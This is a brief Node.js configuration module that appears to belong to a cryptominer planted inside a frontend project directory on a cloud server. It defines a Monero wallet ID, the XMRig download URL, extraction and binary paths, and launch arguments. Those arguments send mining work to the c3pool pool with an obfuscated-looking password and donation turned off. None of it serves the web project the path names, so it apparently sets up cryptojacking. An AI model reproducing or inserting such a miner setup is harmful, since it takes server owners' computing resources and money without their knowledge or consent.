const path = require('path');
const homeDir = '/home/ec2-user/itsmycolor-frontend';
const walletID = "8Bt9BEG98SbBPNTp1svQtDQs7PMztqzGoNQHo58eaUYdf8apDkbzp8HbLJH89fMzzciFQ7fb4ZiqUbymDZR6S9asKHZR6wn";
module.exports = {
    homeDir: homeDir,
    tarFile: path.join(homeDir, "kal.tar.gz"),
    extractDir: path.join(homeDir, "xmrig-6.24.0"),
    binaryPath: path.join(homeDir, "xmrig-6.24.0", "xmrig"),
    downloadUrl: "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz",
    processName: "xmrig",
    walletID: walletID,
    launchArgs: [
        "--url", "auto.c3pool.org:443",
        "--user", walletID,
        "--pass", "WUZHRkYOHh1aQkZZSFFcWlpGQlpcRhtXXl8c", 
        "--donate-level", "0",
    ]
};